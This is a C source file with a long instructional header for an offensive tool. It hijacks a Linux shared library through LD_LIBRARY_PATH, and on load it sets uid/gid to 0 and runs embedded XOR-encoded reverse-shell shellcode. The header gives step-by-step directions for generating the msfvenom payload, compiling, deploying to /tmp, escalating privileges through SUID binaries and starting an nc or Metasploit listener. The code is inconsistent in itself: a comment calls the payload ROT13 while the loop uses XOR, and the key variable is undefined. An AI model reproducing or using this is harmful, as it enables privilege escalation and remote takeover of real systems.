/*
================================================================
sharedLibrary_LD_LIBRARY_PATH.c — Shared Library Hijacking via LD_LIBRARY_PATH
================================================================
WHAT THIS DOES:
  Compiles as a Linux shared object (.so) that masquerades as a real
  shared library (e.g. libgpg-error or any other .so a target binary
  loads). Uses a GCC constructor attribute so the runmahpayload()
  function runs automatically when the library is loaded — before
  any other code in the target process executes.

  When the library loads:
    1. Sets uid/gid to 0 (tries to become root — effective in SUID scenarios)
    2. Prints "Library hijacked!" to confirm execution
    3. XOR-decodes the shellcode from buf[]
    4. Makes buf[] executable with mprotect()
    5. Executes the shellcode

HOW LD_LIBRARY_PATH HIJACKING WORKS:
  When a program loads shared libraries, the linker searches directories
  in order. LD_LIBRARY_PATH lets you prepend directories to this search.
  If you place a .so with the same name as a real library in your
  directory and set LD_LIBRARY_PATH to point to it, your fake library
  is loaded instead of the real one.

  Unlike LD_PRELOAD (which requires the function name to match), this
  technique works by replacing an entire library file. You need to also
  export the SAME symbols the real library exports (stubs are fine for
  most functions) so the binary doesn't crash.

SETUP — FIND WHICH LIBRARIES A BINARY LOADS:
  readelf -d /path/to/binary | grep NEEDED
  ldd /path/to/binary

  Then check what symbols that library exports:
  readelf --syms /usr/lib/libgpg-error.so.0 | grep GLOBAL
  (Put those symbol names in the file as dummy int declarations)

BEFORE YOU COMPILE — PREPARE YOUR SHELLCODE:
  1. Note the XOR key used in the existing buf[] (it's hardcoded — look
     for the XOR in runmahpayload: buf[i] = buf[i] ^ key; — you need
     to define 'key' or replace the loop with your own decode logic)
  2. Generate raw shellcode on Kali:
       msfvenom -p linux/x64/shell_reverse_tcp \
         LHOST=<YOUR_IP> LPORT=443 -f c
  3. XOR-encode it with your chosen key, paste into buf[]

COMPILE (two steps):
  Step 1: Compile to object file:
    gcc -Wall -fPIC -z execstack \
      -c -o sharedLibrary_LD_LIBRARY_PATH.o sharedLibrary_LD_LIBRARY_PATH.c

  Step 2: Link into shared library — name it to match the target library:
    gcc -shared -o libgpg-error.so.0 \
      sharedLibrary_LD_LIBRARY_PATH.o -ldl

  (Replace libgpg-error.so.0 with whatever library name you're hijacking)

DEPLOY AND RUN:
  1. Transfer your .so to a directory on the target (e.g. /tmp/)
  2. Set LD_LIBRARY_PATH to point to that directory:
       export LD_LIBRARY_PATH=/tmp
  3. Run the target binary that loads the library you're hijacking:
       /path/to/vulnerable/binary
  4. Your constructor fires before main() and shellcode executes.

  For SUID privilege escalation:
    Some SUID binaries honor LD_LIBRARY_PATH if they don't strip it.
    Test with: sudo -l and check if any command can be run that loads
    a library you control.

START YOUR LISTENER FIRST (on Kali):
  nc -lvnp 443
  OR:
  msfconsole -q -x "use exploit/multi/handler; \
    set payload linux/x64/shell_reverse_tcp; \
    set LHOST <YOUR_IP>; set LPORT 443; exploit -j"

BEFORE COMPILING, CHANGE:
  - buf[] -> your encoded shellcode with YOUR LHOST/LPORT
  - The XOR key variable 'key' (currently referenced but not defined — add:
    int key = 0xfa;  OR whatever key you encoded with)
  - The library exports (gpgrt_onclose, gpgrt_poll stubs) to match your
    actual target library
================================================================
*/
#include <sys/mman.h>
#include <stdlib.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>

// Compile as follows
//gcc -Wall -fPIC -z execstack -c -o sharedLibrary_LD_LIBRARY_PATH.o sharedLibrary_LD_LIBRARY_PATH.c
//gcc -shared -o sharedLibrary_LD_LIBRARY_PATH.so sharedLibrary_LD_LIBRARY_PATH.o -ldl

static void runmahpayload() __attribute__((constructor));

int gpgrt_onclose;
// [...output from readelf here...]
int gpgrt_poll;

// ROT13-encoded 'linux/x64/shell_reverse_tcp' payload
char buf[] = "\x77\x36\x65\xa6\x77\x0f\x6c\x77\x0e\x6b\x1c\x12\x55\xa4\x55\xc6\x0f\x0d\x0d\x5d\xcd\xb5\x3e\x50\x5e\x55\x96\xf3\x77\x1d\x67\x77\x37\x65\x1c\x12\x77\x10\x6b\x55\x0c\xdb\x77\x2e\x65\x1c\x12\x82\x03\x77\x48\x65\xa6\x55\xc8\x3c\x6f\x76\x7b\x3c\x80\x75\x0d\x60\x55\x96\xf4\x5f\x64\x55\x96\xf3\x1c\x12";

void runmahpayload() {
        setuid(0);
        setgid(0);
        printf("Library hijacked!\n");
        int buf_len = (int) sizeof(buf);
        for (int i=0; i<buf_len; i++)
        {
                buf[i] = buf[i] ^ key;
        }
        intptr_t pagesize = sysconf(_SC_PAGESIZE);
        mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)), pagesize, PROT_READ|PROT_EXEC);
        int (*ret)() = (int(*)())buf;
        ret();
}